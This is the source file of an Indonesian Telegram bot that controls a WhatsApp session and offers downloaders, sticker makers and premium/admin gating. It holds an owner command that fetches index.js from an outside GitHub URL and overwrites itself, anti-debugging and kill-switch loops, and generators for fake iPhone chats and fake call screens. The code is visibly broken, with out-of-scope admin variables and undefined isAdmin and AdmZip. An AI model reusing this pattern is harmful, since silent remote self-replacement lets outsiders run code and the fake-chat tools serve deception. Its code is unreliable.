const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';

// ⬇️ TAMBAH DI SINI
const cmdFile = './database/cmd.json';

function loadCmd() {
  try {
    return JSON.parse(fs.readFileSync(cmdFile));
  } catch {
    return { blocked: [] };
  }
}

function saveCmd() {
  fs.writeFileSync(cmdFile, JSON.stringify(cmdData, null, 2));
}

let cmdData = loadCmd();
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/dapp231/ojan320/refs/heads/main/tokens.json';
const thumbnailUrl = "https://i.ibb.co/8D9b6SSd/e70acea13ba6.jpg";

const thumbnailVideo = "https://files.catbox.moe/qi1mfp.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⬡═—⊱ 𝐀𝐏𝐎𝐋𝐎 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 ⊰—═⬡
┃ STATUS BOT : CONNECTED
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<pre><code class="language-javascript">⟡━⟢ 𝐀𝐏𝐎𝐋𝐎 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 ⟣━⟡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡</code></pre>` 

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};
bot.use((ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();

  const text = ctx.message.text;
  const cmd = text.split(" ")[0].replace("/", "").toLowerCase();

  if (isCommandBlocked(cmd)) {
    return ctx.reply("🚫 Command ini sedang diblokir oleh admin.");
  }

  return next();
});

bot.command("connect", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234DIKZ");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⟡━⟢ APOLO INFINITE ⟣━⟡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});


///tiktok
const memory = {};
bot.command("tiktok", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url) {
    return ctx.reply("Masukkan URL TikTok!\nContoh: /tiktok https://vt.tiktok.com/abc");
  }

  const key = Date.now().toString();
  memory[key] = { url };

  await ctx.reply("Pilih versi API TikTok:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "V1 [ Support Slide ]", callback_data: `ttv1_${key}`, style: "primary" }],
        [{ text: "V2 [ Support Slide ]", callback_data: `ttv2_${key}`, style: "success" }],
        [{ text: "V3 [ No Support ]", callback_data: `ttv3_${key}`, style: "danger" }],
        [{ text: "V4 [ No Support ]", callback_data: `ttv4_${key}`, style: "primary" }]
      ]
    }
  });
});

bot.action(/tt(v1|v2|v3|v4)_(.+)/, async (ctx) => {

  const [, version, key] = ctx.match;
  const saved = memory[key];

  if (!saved) return ctx.answerCbQuery("Data tidak ditemukan!");

  await ctx.answerCbQuery(`Processing TikTok ${version.toUpperCase()}...`);
  await ctx.editMessageText(`⏳ Memproses TikTok ${version.toUpperCase()}...`);

  try {

    let res;

    if (version === "v4") {

      const { data } = await axios.get(
        `https://tikdown.ikyzxz.my.id/api/v1`,
        { params: { url: saved.url } }
      );

      if (!data.status) throw new Error("Download V4 gagal");

      res = data;

      const caption = `
🎵 TikTok Downloader V4

📌 Title : ${res.title || "No Title"}
👤 Author : ${res.author || "Unknown"}
`;

      if (res.download?.nowm) {
        await ctx.replyWithVideo(res.download.nowm, {
          caption: "🎬 Video No Watermark"
        });
      }

      else if (res.download?.wm) {
        await ctx.replyWithVideo(res.download.wm, {
          caption: "🎬 Video (Watermark)"
        });
      }

      if (res.download?.mp3) {
        await ctx.replyWithAudio(
          {
            url: res.download.mp3,
            filename: "tiktok.mp3"
          },
          {
            title: res.title || "TikTok Audio",
            performer: res.author || "TikTok"
          }
        );
      }

    }

    else if (version === "v1") {
      const { data } = await axios.get(
        `https://ikyyzyyrestapi.my.id/download/tiktok`,
        { params: { apikey: "kyzz", query: saved.url } }
      );

      if (!data.status) throw new Error("Download V1 gagal");

      res = data.result;

      const media = [];

      if (res.video) {
        media.push({ type: "video", media: res.video, caption: "🎵 TikTok Video" });
      }

      if (res.slides?.length) {
        res.slides.forEach((sl, idx) => {
          media.push({
            type: "photo",
            media: sl.img_result,
            caption: idx === 0 && !res.video ? "🎵 TikTok Slide" : undefined
          });
        });
      }

      for (let i = 0; i < media.length; i += 10) {
        const batch = media.slice(i, i + 10);

        if (batch.length === 1) {
          if (batch[0].type === "video") {
            await ctx.replyWithVideo(batch[0].media, { caption: batch[0].caption });
          } else {
            await ctx.replyWithPhoto(batch[0].media, { caption: batch[0].caption });
          }
        } else {
          await ctx.replyWithMediaGroup(
            batch.map(m => ({
              type: m.type,
              media: m.media,
              caption: m.caption
            }))
          );
        }
      }

      if (res.audio) {
        await ctx.replyWithAudio(res.audio, { caption: "🎵 Audio TikTok" });
      }
    }

    else if (version === "v2") {
      const { data } = await axios.get(
        `https://ikyyzyyrestapi.my.id/download/tiktokv2`,
        { params: { url: saved.url } }
      );

      if (!data.status) throw new Error("Download V2 gagal");

      res = data.result;

      const media = [];

      res.video?.forEach(v => media.push({ type: "video", media: v }));
      res.audio?.forEach(a => media.push({ type: "audio", media: a }));

      const caption = res.title ? `🎵 ${res.title}` : undefined;

      const videos = media.filter(m => m.type === "video");

      if (videos.length > 0) {
        for (let i = 0; i < videos.length; i += 10) {
          const slice = videos.slice(i, i + 10);
          await ctx.replyWithMediaGroup(
            slice.map((m, idx) => ({
              type: "video",
              media: m.media,
              caption: i === 0 && idx === 0 ? caption : undefined
            }))
          );
        }
      }

      const audios = media.filter(m => m.type === "audio");
      for (const a of audios) await ctx.replyWithAudio(a.media);
    }

    else if (version === "v3") {
      const { data } = await axios.get(
        `https://www.tikwm.com/api/`,
        { params: { url: saved.url } }
      );

      if (data.code !== 0) throw new Error("Download V3 gagal");

      res = data.data;

      const caption = `
🎵 TikTok Downloader

👤 Author : ${res.author.nickname}
📌 Title : ${res.title || "No Title"}
❤️ Likes : ${res.digg_count}
💬 Comments : ${res.comment_count}
🔁 Share : ${res.share_count}
`;

      await ctx.replyWithVideo(res.play, { caption });

      if (res.music) {
        await ctx.replyWithAudio(
          { url: res.music, filename: "tiktok.mp3" },
          {
            title: res.music_info?.title || "TikTok Audio",
            performer: res.music_info?.author || "TikTok",
            thumb: { url: res.music_info?.cover }
          }
        );
      }
    }

    await ctx.editMessageText(`✅ TikTok ${version.toUpperCase()} berhasil dikirim!`);

  } catch (err) {
    console.error(err);
    await ctx.editMessageText(`❌ Gagal download TikTok ${version.toUpperCase()}`);
  }

  delete memory[key];
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

bot.command('bratbahlil', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1).join(' ');
    if (!args) return ctx.reply("❌ Masukkan teks. Contoh: /bratbahlil Halo");

    try {
        const url = `http://ikyyzyyrestapi.my.id/maker/bratbahlil?text=${encodeURIComponent(args)}`;
        await ctx.replyWithPhoto(url, { caption: `✨ BratBahlil: ${args}` });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Gagal membuat gambar");
    }
});

///update
const filePath = path.resolve(__dirname, "index.js");
const repoRaw = "https://raw.githubusercontent.com/andikaponiriawanlubis/Autoupdatee/refs/heads/main/index.js";

bot.command('update', async (ctx) => {
  if ((ctx.from.id != ownerID)) return ctx.reply("Lu Siapa Kontol Jijik Gwa");

  ctx.reply("⏳ Sedang mengecek update...");

  const { data } = await axios.get(repoRaw, { timeout: 10000 });

  if (!data) return ctx.reply("❌ Update gagal: File kosong!");

  // Backup file lama dengan nomor urut
  let backupPath = null;
  if (fs.existsSync(filePath)) {
    let i = 1;
    do {
      backupPath = `${filePath}.backup.${i}`;
      i++;
    } while (fs.existsSync(backupPath));

    fs.copyFileSync(filePath, backupPath);
  }

  // Tulis file baru
  fs.writeFileSync(filePath, data);
  ctx.reply(`✅ Update berhasil!\n📁 Backup dibuat: ${backupPath}\n🔄 Bot akan restart...`);

  setTimeout(() => process.exit(), 2000);
});

//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

function isCommandBlocked(cmd) {
  cmd = cmd.replace("/", "").toLowerCase();
  return cmdData?.blocked?.includes(cmd);
}

bot.command("sky", async (ctx) => {

  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ Kamu tidak punya izin untuk menggunakan command ini.");
  }

  if (isCommandBlocked("sky")) {
    return ctx.reply("🚫 Command ini sedang dinonaktifkan oleh admin.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format:\n/sky /command");
  }

  let command = args[1].toLowerCase().replace("/", "");

  if (!cmdData.blocked.includes(command)) {
    cmdData.blocked.push(command);
    saveCmd();
  }

  ctx.reply(`🚫 Command /${command} berhasil diblokir.`);
});

bot.command("bukacmd", async (ctx) => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner/admin");
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format:\n/bukacmd /command");
  }

  let command = args[1].toLowerCase().replace("/", "");

  cmdData.blocked = cmdData.blocked.filter(c => c !== command);
  saveCmd();

  ctx.reply(`✅ Command /${command} sudah dibuka.`);
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });

bot.command("fixcode", async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`📂 Kirim file .js dan reply dengan perintah /fixcode`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js bre!");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    console.error("FixCode Error:", err);
    ctx.reply("⚠️ Terjadi kesalahan waktu memperbaiki kode.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

